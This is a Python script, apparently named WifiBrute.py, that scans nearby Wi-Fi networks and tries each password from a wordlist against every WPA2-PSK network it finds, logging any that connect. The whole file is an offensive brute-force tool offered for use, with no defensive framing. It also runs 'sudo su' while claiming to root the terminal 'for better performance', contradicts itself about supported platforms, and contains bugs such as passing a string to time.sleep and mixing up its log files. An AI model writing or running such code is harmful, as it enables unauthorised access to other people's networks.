import os
import platform
import sys
try:
    import pywifi
except ModuleNotFoundError:
    os.system("pip install pywifi")
from pywifi import const
from scripts.banner import banner2,banner,clear
from scripts.sprint import sprint
from scripts.colors import ran,y,r,g,c

import time


yes = ["y" , "yes"]
no = ["no" , "n"]

def help():
    print(f"\t{r}-> {c}Usage:~ {y}python3 WifiBrute.py <wordlist>\n\t{r}-> {c}python3 WifiBrute.py {y}(it wil use default wordlist")
    exit()


if len(sys.argv) < 2:
    p_in = "passwords.txt"

elif sys.argv[1] == "--help":
    help()

else:
    p_in = sys.argv[1]


def rootCHEK():
    s = os.popen("whoami").read()
    print(s)
    if ("root") in s:
        print("You are root")
        pass
    else:
        if "aarch64" in platform.machine():
            print("Run this tool as root in Termux.")
            exit()
        if "Linux" in platform.platform():
            sprint(f"{r}Automatically rooting your terminal for better performance")
            print("Please wait...")
            time.sleep("2")
            os.system("sudo su")
            sprint(f"{g}Done!")
            print(f"Please relaunch this software {r}<3{g}")
        if "Windows" in platform.platform():
            print("I am developed to work on Windows.")

        time.sleep(3)

rootCHEK()


clear()

sprint(f"\n\n{r} /---WARNING---\ {c} ")
sprint(f"\n\n{y} Im ment to run in windows <3")
sprint(f"\n\n{c} Run in Termux")
sprint(f"\n\n{c} Run as R00T")
sprint(f"\n{g}Preparing...")
time.sleep(2)
clear()
banner()




passlist = p_in


passwords = [x.strip("\n") for x in open(passlist , "r", encoding="UTF-8" , errors="ignore").readlines()]
tried = [x.strip("\n").split("--")[0] for x in open("avail_nearby_wifis.txt","r").readlines()]
found = [x.strip("\n") for x in open("already_tried_passwords.txt","r").readlines()]
ts = 15


def scan(face):
    face.scan()
    return face.scan_results()

def main():
    wifi = pywifi.PyWiFi()
    inface = wifi.interfaces()[0]

    scanner = scan(inface)

    num = len(scanner)

    print(f"{r}[!]Number of wifi found: {ran}{str(num)}")
    input(f"{y}\n[?]Press enter to start>")
          
    for i,x in enumerate(scanner):
        res = test(num-i , inface , x , passwords , ts)

        if res:
            print(ran + "="*20)
            print(f"{r}Password found : {c}{str(res)}\n")

            with open("avail_nearby_wifis.txt", "a") as f:
                f.write(str(res) + "\n")

            print(ran + "="*20)


def test(i ,face,x,key,ts):
    wifi_name = x.bssid if len(x.ssid) > len(x.bssid) else x.ssid

    if wifi_name in tried:
        print(f"{r}[!] {y}Password tried -- {str(wifi_name)}\n{g}Password is known!")
        return False

    print(ran + "Trying to connect to wifi "+str(wifi_name))

    for n,password in enumerate(key):
        if wifi_name+"--"+password in found:
            print(r + "Password already found +_+")

            continue
        else:
            with open("already_tried_password" , "a") as f:
                f.write(str(wifi_name)+"--"+str(password)+"\n")
        tried.append(str(wifi_name)+"--"+str(password))
        print(f"{ran}Trying password {r}{str(password)} {c}{str(n)} / {g}{str(len(key))}")

        profile = pywifi.Profile()
        profile.ssid = wifi_name
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password
        # Remove all hotspot configurations
        face.remove_all_network_profiles()
        tmp_profile = face.add_network_profile(profile)
        face.connect(tmp_profile)
        code = 10
        t1 = time.time()
        # Cyclic refresh status, if set to 0, the password is wrong, if timeout, proceed to the next
        while code != 0:
            time.sleep(0.1)
            code = face.status()
            now = time.time() - t1
            if now > ts:
                break
            if code == 4:
                face.disconnect()
                return str(wifi_name) + "--" + str(password)
    return False

cont = ""

while cont not in no:
    main()

    ch = input(ran+"[?]Do you want to continue?(y/n):").lower()

    if ch in no:
        clear()
        banner2()
    else:
        clear()
        banner2()
